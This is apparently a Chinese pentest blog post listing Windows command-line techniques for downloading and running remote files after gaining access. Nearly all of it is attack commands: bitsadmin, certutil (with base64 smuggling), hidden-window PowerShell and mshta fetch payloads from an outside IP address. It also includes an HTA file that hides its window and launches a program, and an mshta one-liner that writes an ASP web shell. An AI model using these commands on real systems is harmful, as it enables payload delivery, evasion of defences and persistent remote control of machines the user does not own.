+++
date = "2018-02-06T15:12:32+08:00"
description = "在windows的终端下下载文件，在windows的终端下执行远程文件"
draft = false
tags = ["intranet"]
title = "Windows终端下载文件和执行远程文件"
topics = ["Pentest"]

+++

环境：Windows Server 2008 R2 Enterprise

### 0x00 bitsadmin下载文件
```bash
bitsadmin /rawreturn /transfer getfile http://114.115.214.203/a.exe C:\Windows\Temp\a.exe
bitsadmin /rawreturn /transfer getpayload http://114.115.214.203/a.zip C:\Windows\Temp\a.zip
bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.214.203/a.exe C:\Windows\Temp\a.exe
```

### 0x01 certutil下载文件
保存在当前目录
```bash
certutil -urlcache -split -f http://114.115.214.203/a.exe a.exe
```

有时会下载二进制文件的base64编码后的字符串，然后再解码
```
本地：certutil -encode cc.exe base64.txt
目标：certutil -urlcache -split -f http://114.115.214.203/base64.txt
目标：certutil -decode base64.txt cc.exe
```

文件会以二进制形式缓存到目录：C:\Users\Administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
```bash
certutil -urlcache -f http://114.115.214.203/a.exe
```

### 0x02 powershell下载文件
```bash
powershell (new-object System.Net.WebClient).DownloadFile("http://114.115.214.203/a.exe","C:\Windows\Temp\a.exe")

#-w hidden 下载后终端自动退出
powershell -w hidden -c (new-object System.Net.WebClient).DownloadFile("http://114.115.214.203/a.exe","C:\Windows\Temp\a.exe")
```

### 0x03 mshta下载文件与执行远程文件
使用mshta命令的文件都会被缓存到：C:\Users\Administrator\AppData\Local\Microsoft\Windows\Temporary Internet Files

* 执行远程hta文件

```bash
mshta http://114.115.214.203/payload.hta
mshta http://114.115.214.203/a.exe
#payload.hta和a.exe都会被缓存在IE的缓存目录
```
payload.hta
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <script language="VBScript">
        Window.ReSizeTo 0, 0
        Window.moveTo -2000,-2000
        Set objShell = CreateObject("Wscript.Shell")
        objShell.Run "calc.exe"
        self.close
    </script>
</head>
<body>

demo

</body>
</html>
```

* 写文件的方法

```
mshta vbscript:createobject("scripting.filesystemobject").createtextfile("a.asp",2,ture).writeline("<%execute(request('l'))%>")(window.close)
```

<br />
#### Reference(侵删)：
* [https://xianzhi.aliyun.com/forum/topic/1654](https://xianzhi.aliyun.com/forum/topic/1654)
* [https://evi1cg.me/archives/Tricks.html](https://evi1cg.me/archives/Tricks.html)
* [https://3gstudent.github.io/3gstudent.github.io/渗透测试中的certutil.exe/](https://3gstudent.github.io/3gstudent.github.io/渗透测试中的certutil.exe/)




未完待续。。。